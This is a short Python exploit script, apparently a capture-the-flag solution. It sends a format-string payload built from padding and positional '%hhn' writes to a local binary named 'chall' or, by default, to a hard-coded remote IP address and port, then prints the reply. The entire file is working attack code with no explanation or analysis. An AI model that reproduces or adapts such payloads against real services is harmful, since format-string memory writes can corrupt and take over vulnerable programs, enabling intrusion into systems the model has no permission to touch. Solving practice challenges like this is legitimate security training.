#!/usr/bin/env python3
import socket
import subprocess
import sys


PAYLOAD = (
    b"A" * 68
    + b"%1$hhn"
    + b"B" * 5
    + b"%2$hhn"
    + b"C" * 6
    + b"%3$hhn"
    + b"D" * 7
    + b"%4$hhn\n"
)


def run_remote(host: str, port: int) -> bytes:
    with socket.create_connection((host, port), timeout=10) as sock:
        sock.recv(4096)
        sock.sendall(PAYLOAD)
        out = bytearray()
        while True:
            data = sock.recv(4096)
            if not data:
                break
            out += data
        return bytes(out)


def run_local(path: str = "./chall") -> bytes:
    proc = subprocess.run(
        [path],
        input=PAYLOAD,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    return proc.stdout


def main() -> int:
    if len(sys.argv) == 2 and sys.argv[1] == "--local":
        sys.stdout.buffer.write(run_local())
        return 0

    host = sys.argv[1] if len(sys.argv) > 1 else "34.62.69.250"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 41058
    sys.stdout.buffer.write(run_remote(host, port))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
